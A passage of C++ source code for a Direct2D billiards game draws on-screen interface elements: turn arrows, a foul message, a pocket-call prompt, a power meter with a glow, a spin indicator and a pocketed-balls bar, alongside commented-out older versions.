            D2D1_POINT_2F baseTop = D2D1::Point2F(cx, cy - arrowSizeBase / 2.0f);          // triangle top
            D2D1_POINT_2F baseBot = D2D1::Point2F(cx, cy + arrowSizeBase / 2.0f);          // triangle bottom

            // Rectangle coordinates for the tail portion:
            D2D1_POINT_2F r1 = D2D1::Point2F(cx - notchDepth, cy - notchWidth / 2.0f);   // rect top-left
            D2D1_POINT_2F r2 = D2D1::Point2F(cx, cy - notchWidth / 2.0f);                 // rect top-right
            D2D1_POINT_2F r3 = D2D1::Point2F(cx, cy + notchWidth / 2.0f);                 // rect bottom-right
            D2D1_POINT_2F r4 = D2D1::Point2F(cx - notchDepth, cy + notchWidth / 2.0f);    // rect bottom-left

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(baseTop);
                    pSink->AddLine(r2); // transition from triangle into rectangle
                    pSink->AddLine(r1);
                    pSink->AddLine(r4);
                    pSink->AddLine(r3);
                    pSink->AddLine(baseBot);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }


            SafeRelease(&pArrowBrush);
        }

        //original
    /*
        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            if (currentPlayer == 1) {
    arrowBackX = p1Rect.left - 25.0f; // Position left of the box
                arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
                // Define points for right-pointing arrow
                //D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
                //D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
                //D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back
                // Enhanced arrow with base rectangle intersection
        float notchDepth = 6.0f; // Depth of square base ""stem""
        float notchWidth = 4.0f; // Thickness of square part

        D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
        D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
        D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY - notchWidth / 2.0f); // Square Left-Top
        D2D1_POINT_2F pt4 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY + notchWidth / 2.0f); // Square Left-Bottom
        D2D1_POINT_2F pt5 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back


        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(pt2);
                pSink->AddLine(pt3);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
            }


            //==================else player 2
            else { // Player 2
             // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
             // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    arrowBackX = p2Rect.left - 25.0f; // Position left of the box
    arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
    // Define points for right-pointing arrow
    D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
    D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
    D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

    ID2D1PathGeometry* pPath = nullptr;
    if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
        ID2D1GeometrySink* pSink = nullptr;
        if (SUCCEEDED(pPath->Open(&pSink))) {
            pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
            pSink->AddLine(pt2);
            pSink->AddLine(pt3);
            pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
            pSink->Close();
            SafeRelease(&pSink);
            pRT->FillGeometry(pPath, pArrowBrush);
        }
        SafeRelease(&pPath);
    }
            }
            */


            // --- Persistent Blue 8?Ball Call Arrow & Prompt ---
        /*if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
        {
            // determine index (default top?right)
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
        }*/

        // --- Persistent Blue 8?Ball Pocket Arrow & Prompt (once called) ---
    /* if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
    {
        // 1) Determine pocket index
        int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
        // If the other player had called but it's now your turn, still show that call
        if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
        if (idx < 0) idx = 2; // default to top?right if somehow still unset

        // 2) Draw large blue arrow
        ID2D1SolidColorBrush* pArrow = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
        if (pArrow) {
            auto P = pocketPositions[idx];
            D2D1_POINT_2F tri[3] = {
                { P.x - 15.0f, P.y - 40.0f },
                { P.x + 15.0f, P.y - 40.0f },
                { P.x       , P.y - 10.0f }
            };
            ID2D1PathGeometry* geom = nullptr;
            pFactory->CreatePathGeometry(&geom);
            ID2D1GeometrySink* sink = nullptr;
            geom->Open(&sink);
            sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
            sink->AddLines(&tri[1], 2);
            sink->EndFigure(D2D1_FIGURE_END_CLOSED);
            sink->Close();
            pRT->FillGeometry(geom, pArrow);
            SafeRelease(&sink);
            SafeRelease(&geom);
            SafeRelease(&pArrow);
        }

        // 3) Draw persistent prompt text
        D2D1_RECT_F txt = D2D1::RectF(
            TABLE_LEFT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
            TABLE_RIGHT,
            TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
        );
        pRT->DrawText(
            L""Choose a pocket..."",
            (UINT32)wcslen(L""Choose a pocket...""),
            pTextFormat,
            &txt,
            pBrush
        );
        // Note: no 'return'; allow foul/turn text to draw beneath if needed
    } */

    // new code ends here

        // --- MODIFIED: Foul Text (Large Red, Bottom Center) ---
        if (foulCommitted && currentGameState != SHOT_IN_PROGRESS) {
            ID2D1SolidColorBrush* pFoulBrush = nullptr;
            pRT->CreateSolidColorBrush(FOUL_TEXT_COLOR, &pFoulBrush);
            if (pFoulBrush && pLargeTextFormat) {
                // Calculate Rect for bottom-middle area
                float foulWidth = 200.0f; // Adjust width as needed
                float foulHeight = 60.0f;
                float foulLeft = TABLE_LEFT + (TABLE_WIDTH / 2.0f) - (foulWidth / 2.0f);
                // Position below the pocketed balls bar
                float foulTop = pocketedBallsBarRect.bottom + 10.0f;
                D2D1_RECT_F foulRect = D2D1::RectF(foulLeft, foulTop, foulLeft + foulWidth, foulTop + foulHeight);

                // --- Set text alignment to center for foul text ---
                pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                pRT->DrawText(L""FOUL!"", 5, pLargeTextFormat, &foulRect, pFoulBrush);

                // --- Restore default alignment for large text if needed elsewhere ---
                // pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                // pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);

                SafeRelease(&pFoulBrush);
            }
        }

        // --- Blue Arrow & Prompt for 8?Ball Call (while choosing or after called) ---
        if ((currentGameState == CHOOSING_POCKET_P1
            || currentGameState == CHOOSING_POCKET_P2)
            || (calledPocketP1 >= 0 || calledPocketP2 >= 0))
        {
            // determine index:
            //  - if a call exists, use it
            //  - if still choosing, use hover if any
            // determine index: use only the clicked call; default to top?right if unset
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt below pockets
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
            // do NOT return here; allow foul/turn text to display under the arrow
        }

        // Removed Obsolete
        /*
        // --- 8-Ball Pocket Selection Arrow & Prompt ---
        if (currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2) {
            // Determine which pocket to highlight (default to Top-Right if unset)
            int idx = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
            if (idx < 0) idx = 2;

            // Draw the downward arrow
            ID2D1SolidColorBrush* pArrowBrush = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
            if (pArrowBrush) {
                D2D1_POINT_2F P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 10.0f, P.y - 30.0f},
                    {P.x + 10.0f, P.y - 30.0f},
                    {P.x        , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrowBrush);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrowBrush);
            }

            // Draw “Choose a pocket...” text under the table
            D2D1_RECT_F prompt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &prompt,
                pBrush
            );

            return; // Skip normal turn/foul text
        }
        */


        // Show AI Thinking State (Unchanged from previous step)
        if (currentGameState == AI_THINKING && pTextFormat) {
            ID2D1SolidColorBrush* pThinkingBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Orange), &pThinkingBrush);
            if (pThinkingBrush) {
                D2D1_RECT_F thinkingRect = p2Rect;
                thinkingRect.top += 20; // Offset within P2 box
                // Ensure default text alignment for this
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
                pRT->DrawText(L""Thinking..."", 11, pTextFormat, &thinkingRect, pThinkingBrush);
                SafeRelease(&pThinkingBrush);
            }
        }

        SafeRelease(&pBrush);

        // --- Draw CHEAT MODE label if active ---
        if (cheatModeEnabled) {
            ID2D1SolidColorBrush* pCheatBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Red), &pCheatBrush);
            if (pCheatBrush && pTextFormat) {
                D2D1_RECT_F cheatTextRect = D2D1::RectF(
                    TABLE_LEFT + 10.0f,
                    TABLE_TOP + 10.0f,
                    TABLE_LEFT + 200.0f,
                    TABLE_TOP + 40.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""CHEAT MODE ON"", wcslen(L""CHEAT MODE ON""), pTextFormat, &cheatTextRect, pCheatBrush);
            }
            SafeRelease(&pCheatBrush);
        }
    }

    void DrawPowerMeter(ID2D1RenderTarget* pRT) {
        // Draw Border
        ID2D1SolidColorBrush* pBorderBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
        if (!pBorderBrush) return;
        pRT->DrawRectangle(&powerMeterRect, pBorderBrush, 2.0f);
        SafeRelease(&pBorderBrush);

        // Create Gradient Fill
        ID2D1GradientStopCollection* pGradientStops = nullptr;
        ID2D1LinearGradientBrush* pGradientBrush = nullptr;
        D2D1_GRADIENT_STOP gradientStops[4];
        gradientStops[0].position = 0.0f;
        gradientStops[0].color = D2D1::ColorF(D2D1::ColorF::Green);
        gradientStops[1].position = 0.45f;
        gradientStops[1].color = D2D1::ColorF(D2D1::ColorF::Yellow);
        gradientStops[2].position = 0.7f;
        gradientStops[2].color = D2D1::ColorF(D2D1::ColorF::Orange);
        gradientStops[3].position = 1.0f;
        gradientStops[3].color = D2D1::ColorF(D2D1::ColorF::Red);

        pRT->CreateGradientStopCollection(gradientStops, 4, &pGradientStops);
        if (pGradientStops) {
            D2D1_LINEAR_GRADIENT_BRUSH_PROPERTIES props = {};
            props.startPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.bottom);
            props.endPoint = D2D1::Point2F(powerMeterRect.left, powerMeterRect.top);
            pRT->CreateLinearGradientBrush(props, pGradientStops, &pGradientBrush);
            SafeRelease(&pGradientStops);
        }

        // Calculate Fill Height
        float fillRatio = 0;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Determine if power meter should reflect shot power (human aiming or AI preparing)
        bool humanIsAimingPower = isAiming && (currentGameState == AIMING || currentGameState == BREAKING);
        // NEW Condition: AI is displaying its aim, so show its chosen power
        bool aiIsVisualizingPower = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (humanIsAimingPower || aiIsVisualizingPower) { // Use the new condition
            fillRatio = shotPower / MAX_SHOT_POWER;
        }
        float fillHeight = (powerMeterRect.bottom - powerMeterRect.top) * fillRatio;
        D2D1_RECT_F fillRect = D2D1::RectF(
            powerMeterRect.left,
            powerMeterRect.bottom - fillHeight,
            powerMeterRect.right,
            powerMeterRect.bottom
        );

        if (pGradientBrush) {
            pRT->FillRectangle(&fillRect, pGradientBrush);
            SafeRelease(&pGradientBrush);
        }

        // Draw scale notches
        ID2D1SolidColorBrush* pNotchBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pNotchBrush);
        if (pNotchBrush) {
            for (int i = 0; i <= 8; ++i) {
                float y = powerMeterRect.top + (powerMeterRect.bottom - powerMeterRect.top) * (i / 8.0f);
                pRT->DrawLine(
                    D2D1::Point2F(powerMeterRect.right + 2.0f, y),
                    D2D1::Point2F(powerMeterRect.right + 8.0f, y),
                    pNotchBrush,
                    1.5f
                );
            }
            SafeRelease(&pNotchBrush);
        }

        // Draw ""Power"" Label Below Meter
        if (pTextFormat) {
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pTextBrush);
            if (pTextBrush) {
                D2D1_RECT_F textRect = D2D1::RectF(
                    powerMeterRect.left - 20.0f,
                    powerMeterRect.bottom + 8.0f,
                    powerMeterRect.right + 20.0f,
                    powerMeterRect.bottom + 38.0f
                );
                pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
                pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_NEAR);
                pRT->DrawText(L""Power"", 5, pTextFormat, &textRect, pTextBrush);
                SafeRelease(&pTextBrush);
            }
        }

        // Draw Glow Effect if fully charged or fading out
        static float glowPulse = 0.0f;
        static bool glowIncreasing = true;
        static float glowFadeOut = 0.0f; // NEW: tracks fading out

        if (shotPower >= MAX_SHOT_POWER * 0.99f) {
            // While fully charged, keep pulsing normally
            if (glowIncreasing) {
                glowPulse += 0.02f;
                if (glowPulse >= 1.0f) glowIncreasing = false;
            }
            else {
                glowPulse -= 0.02f;
                if (glowPulse <= 0.0f) glowIncreasing = true;
            }
            glowFadeOut = 1.0f; // Reset fade out to full
        }
        else if (glowFadeOut > 0.0f) {
            // If shot fired, gradually fade out
            glowFadeOut -= 0.02f;
            if (glowFadeOut < 0.0f) glowFadeOut = 0.0f;
        }

        if (glowFadeOut > 0.0f) {
            ID2D1SolidColorBrush* pGlowBrush = nullptr;
            float effectiveOpacity = (0.3f + 0.7f * glowPulse) * glowFadeOut;
            pRT->CreateSolidColorBrush(
                D2D1::ColorF(D2D1::ColorF::Red, effectiveOpacity),
                &pGlowBrush
            );
            if (pGlowBrush) {
                float glowCenterX = (powerMeterRect.left + powerMeterRect.right) / 2.0f;
                float glowCenterY = powerMeterRect.top;
                D2D1_ELLIPSE glowEllipse = D2D1::Ellipse(
                    D2D1::Point2F(glowCenterX, glowCenterY - 10.0f),
                    12.0f + 3.0f * glowPulse,
                    6.0f + 2.0f * glowPulse
                );
                pRT->FillEllipse(&glowEllipse, pGlowBrush);
                SafeRelease(&pGlowBrush);
            }
        }
    }

    void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pWhiteBrush = nullptr;
        ID2D1SolidColorBrush* pRedBrush = nullptr;

        pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
        pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

        if (!pWhiteBrush || !pRedBrush) {
            SafeRelease(&pWhiteBrush);
            SafeRelease(&pRedBrush);
            return;
        }

        // Draw White Ball Background
        D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
        pRT->FillEllipse(&bgEllipse, pWhiteBrush);
        pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


        // Draw Red Dot for Spin Position
        float dotRadius = 4.0f;
        float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
        float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
        D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
        pRT->FillEllipse(&dotEllipse, pRedBrush);

        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
    }


    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBgBrush = nullptr;
        ID2D1SolidColorBrush* pBallBrush = nullptr;

        // Ensure render target is valid before proceeding
        if (!pRT) return;

        HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
        if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
        if (FAILED(hr)) {
            SafeRelease(&pBgBrush);
            SafeRelease(&pBallBrush);
            return; // Exit if brush creation fails
        }

        // Draw the background bar (rounded rect)
        D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
        float baseAlpha = 0.8f;
        float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
        float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
        pBgBrush->SetOpacity(finalAlpha);
        pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
        pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

        // --- Draw small circles for pocketed balls inside the bar ---

        // Calculate dimensions based on the bar's height for better scaling
        float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
        float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
        float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
        float padding = spacing * 0.75f; // Add padding from the edges
        float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

        // Starting X positions with padding
        float currentX_P1 = pocketedBallsBarRect.left + padding;
        float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

        int p1DrawnCount = 0;
        int p2DrawnCount = 0;
        const int maxBallsToShow = 7; // Max balls per player in the bar

        for (const auto& b : balls) {
            if (b.isPocketed) {
                // Skip cue ball and 8-ball in this indicator
                if (b.id == 0 || b.id == 8) continue;

                bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
                bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

                if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P1 balls from left to right
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p1DrawnCount++;
                }
                else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P2 balls from right to left
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p2DrawnCount++;
                }
                // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
                // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
            }
        }

        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
    }

    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
        if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
            return; // Only show when placing/dragging
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

        if (pGhostBrush) {
            D2D1_POINT_2F drawPos;
            if (isDraggingCueBall) {
                drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
            }
            else {
                // If not dragging but in placement state, show at current ball pos
                drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
            }

            // Check if the placement is valid before drawing differently?
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

            if (!isValid) {
                // Maybe draw red outline if invalid placement?
                pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
            }


            D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
            pRT->FillEllipse(&ghostEllipse, pGhostBrush);
            pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

            SafeRelease(&pGhostBrush);
        }
    }

    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT) {
        /*  Never show the arrow while the player is still placing the
        cue-ball (ball-in-hand) – it otherwise hides behind the
        ghost-ball and can lock the UI.                               */

        /* Still skip the opening-break placement,
       but show the arrow during BALL-IN-HAND */
       // ? skip when no active call for the CURRENT shooter
        if ((currentPlayer == 1 && calledPocketP1 < 0) ||
            (currentPlayer == 2 && calledPocketP2 < 0))    return;
        /*if (currentGameState == PRE_BREAK_PLACEMENT)
            return;*/ //new ai-asked-to-disable
            /*if (currentGameState == BALL_IN_HAND_P1 ||
                currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT)
            {
                return;
            }*/

        int pocketToIndicate = -1;
        // Whenever EITHER player has pocketed their first 7 and has called (human or AI),
        // we forcibly show their arrow—regardless of currentGameState.
        if ((currentPlayer == 1 && player1Info.ballsPocketedCount >= 7 && calledPocketP1 >= 0) ||
            (currentPlayer == 2 && player2Info.ballsPocketedCount >= 7 && calledPocketP2 >= 0))
        {
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        /*// A human player is actively choosing if they are in the CHOOSING_POCKET state.
        bool isHumanChoosing = (currentGameState == CHOOSING_POCKET_P1 || (currentGameState == CHOOSING_POCKET_P2 && !isPlayer2AI));

        if (isHumanChoosing) {
            // When choosing, show the currently selected pocket (which has a default).
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        else if (IsPlayerOnEightBall(currentPlayer)) {
            // If it's a normal turn but the player is on the 8-ball, show their called pocket as a reminder.
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }*/

        if (pocketToIndicate < 0 || pocketToIndicate > 5) {
            return; // Don't draw if no pocket is selected or relevant.
        }

        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow, 0.9f), &pArrowBrush);
        if (!pArrowBrush) return;

        // ... The rest of your arrow drawing geometry logic remains exactly the same ...
        // (No changes needed to the points/path drawing, only the logic above)
        D2D1_POINT_2F targetPocketCenter = pocketPositions[pocketToIndicate];
        float arrowHeadSize = HOLE_VISUAL_RADIUS * 0.5f;
        float arrowShaftLength = HOLE_VISUAL_RADIUS * 0.3f;
        float arrowShaftWidth = arrowHeadSize * 0.4f;
        float verticalOffsetFromPocketCenter = HOLE_VISUAL_RADIUS * 1.6f;
        D2D1_POINT_2F tip, baseLeft, baseRight, shaftTopLeft, shaftTopRight, shaftBottomLeft, shaftBottomRight;

        if (targetPocketCenter.y == TABLE_TOP) {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y + verticalOffsetFromPocketCenter + arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y - arrowShaftLength);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y - arrowShaftLength);
        }
        else {
